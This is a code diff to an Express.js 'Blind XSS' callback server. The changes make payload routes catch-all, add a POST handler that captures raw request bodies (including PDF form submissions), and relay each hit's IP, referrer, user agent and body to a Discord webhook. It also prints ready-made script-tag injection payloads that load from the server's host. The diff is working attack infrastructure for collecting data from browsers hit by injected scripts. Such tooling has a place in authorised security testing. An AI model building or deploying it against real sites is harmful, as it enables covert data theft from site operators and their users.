@@ -195,10 +195,10 @@ app.get("/i/:marker.gif", (req, res) => {
   res.send(Buffer.from("R0lGODlhAQABAPAAAP///wAAACH5BAAAAAAALAAAAAABAAEAAAICRAEAOw==", "base64"));
 });
 
-app.get("/x/*", (req, res) => {
+app.get("*", (req, res) => {
   writeCallback({
     ip: req.ip,
-    marker: markerFromPath(req.params[0]),
+    marker: markerFromPath(req.path),
     pageUrl: "",
     referrer: cleanString(req.get("referer") || ""),
     userAgent: cleanString(req.get("user-agent") || ""),
@@ -213,7 +213,23 @@ app.get("/x/*", (req, res) => {
     "X-Content-Type-Options": "nosniff"
   });
 
-  res.send(buildPayload(publicBaseUrl, req.params[0]));
+  res.send(buildPayload(publicBaseUrl, req.path));
+});
+
+app.post("*", captureRawBody, (req, res) => {
+  writeCallback({
+    ip: req.ip,
+    marker: markerFromPath(req.path),
+    pageUrl: "",
+    referrer: cleanString(req.get("referer") || ""),
+    userAgent: cleanString(req.get("user-agent") || ""),
+    language: cleanString(req.get("accept-language") || ""),
+    viewport: "",
+    rawBody: cleanString(req.rawBody || ""),
+    source: "payload-post"
+  });
+
+  res.status(204).end();
 });
 
 app.use((_req, res) => {
@@ -222,8 +238,43 @@ app.use((_req, res) => {
 
 app.listen(PORT, () => {
   console.log(`Blind XSS server listening on http://localhost:${PORT}`);
-  console.log(`Example payload: <script src="${publicBaseUrl}/x/blind-xss"></script>`);
+  console.log(`Example payload: <script src="${publicBaseUrl}/blind-xss"></script>`);
 });
+
+function captureRawBody(req, res, next) {
+  // If express.json()/express.urlencoded() already parsed a matching
+  // Content-Type, reuse that instead of trying to read the stream again.
+  if (req.body && typeof req.body === "object" && Object.keys(req.body).length) {
+    req.rawBody = JSON.stringify(req.body);
+    next();
+    return;
+  }
+  if (typeof req.body === "string" && req.body.length) {
+    req.rawBody = req.body;
+    next();
+    return;
+  }
+
+  // Otherwise (e.g. a PDF SubmitForm sending application/vnd.fdf, or any
+  // other content type the global parsers ignore) read the raw bytes so we
+  // can still log what was actually sent.
+  let data = "";
+  req.setEncoding("utf8");
+  req.on("data", (chunk) => {
+    data += chunk;
+    if (data.length > 1_000_000) {
+      req.destroy();
+    }
+  });
+  req.on("end", () => {
+    req.rawBody = data;
+    next();
+  });
+  req.on("error", () => {
+    req.rawBody = "";
+    next();
+  });
+}
 
 function cleanString(value) {
   if (typeof value !== "string") {
@@ -368,6 +419,7 @@ function writeCallback(entry) {
     userAgent: entry.userAgent || "",
     language: entry.language || "",
     viewport: entry.viewport || "",
+    rawBody: entry.rawBody || "",
     source: entry.source || "unknown"
   };
 
@@ -376,13 +428,16 @@ function writeCallback(entry) {
   notifyDiscord(normalized);
 }
 
+// Discord embed field values are capped at 1024 chars each.
+const DISCORD_FIELD_LIMIT = 1024;
+
 function notifyDiscord(entry) {
   if (!discordWebhookUrl) {
     return;
   }
 
   const page = entry.pageUrl || entry.referrer || "Unknown page";
-  const fields = [
+  const baseFields = [
     { name: "Marker", value: truncateDiscord(entry.marker), inline: true },
     { name: "Source", value: truncateDiscord(entry.source), inline: true },
     { name: "IP", value: truncateDiscord(entry.ip || "Unknown"), inline: true },
@@ -390,15 +445,53 @@ function notifyDiscord(entry) {
     { name: "User Agent", value: truncateDiscord(entry.userAgent || "Unknown"), inline: false }
   ];
 
+  const rawBody = String(entry.rawBody || "");
+
+  if (!rawBody) {
+    sendDiscordEmbed(baseFields, entry.receivedAt, "New Blind XSS Hit");
+    return;
+  }
+
+  if (rawBody.length <= DISCORD_FIELD_LIMIT) {
+    sendDiscordEmbed(
+      [...baseFields, { name: "Body", value: rawBody, inline: false }],
+      entry.receivedAt,
+      "New Blind XSS Hit"
+    );
+    return;
+  }
+
+  // Body doesn't fit in a single field/message — send it across two messages
+  // instead of silently truncating it.
+  const firstHalf = rawBody.slice(0, DISCORD_FIELD_LIMIT);
+  const secondHalf = rawBody.slice(DISCORD_FIELD_LIMIT, DISCORD_FIELD_LIMIT * 2);
+
+  sendDiscordEmbed(
+    [...baseFields, { name: "Body (1/2)", value: firstHalf, inline: false }],
+    entry.receivedAt,
+    "New Blind XSS Hit"
+  );
+
+  sendDiscordEmbed(
+    [
+      { name: "Marker", value: truncateDiscord(entry.marker), inline: true },
+      { name: "Body (2/2)", value: truncateDiscord(secondHalf), inline: false }
+    ],
+    entry.receivedAt,
+    "New Blind XSS Hit (continued)"
+  );
+}
+
+function sendDiscordEmbed(fields, timestamp, title) {
   fetch(discordWebhookUrl, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
       username: "Blind XSS Monitor",
       embeds: [{
-        title: "New Blind XSS Hit",
+        title,
         color: 2140567,
-        timestamp: entry.receivedAt,
+        timestamp,
         fields
       }]
     })
@@ -427,6 +520,7 @@ function normalizeImportedEntry(entry) {
     userAgent: cleanString(entry.userAgent),
     language: cleanString(entry.language),
     viewport: cleanString(entry.viewport),
+    rawBody: cleanString(entry.rawBody),
     source: cleanString(entry.source) || "import"
   };
 }
@@ -589,7 +683,7 @@ function buildLoginPage(hasError = false, message = "Invalid password.") {
 }
 
 function buildDashboard(baseUrl) {
-  const samplePayload = `<script src="${baseUrl}/x/blind-xss"></script>"/><script src="${baseUrl}/x/blind-xss1"></script>`;
+  const samplePayload = `<script src="${baseUrl}/blind-xss"></script>"/><script src="${baseUrl}/blind-xss1"></script>`;
 
   return `<!doctype html>
 <html lang="en">
@@ -1071,8 +1165,8 @@ function buildDashboard(baseUrl) {
 
     function payloadForMarker(marker) {
       const clean = marker.replace(/^\\/+/, "").trim() || "blind-xss";
-      return '<script src="' + baseUrl + '/x/' + clean + '"></' + 'script>"/><script src="' +
-        baseUrl + '/x/' + clean + '1"></' + 'script>';
+      return '<script src="' + baseUrl + '/' + clean + '"></' + 'script>"/><script src="' +
+        baseUrl + '/' + clean + '1"></' + 'script>';
     }
 
     function updatePayload() {
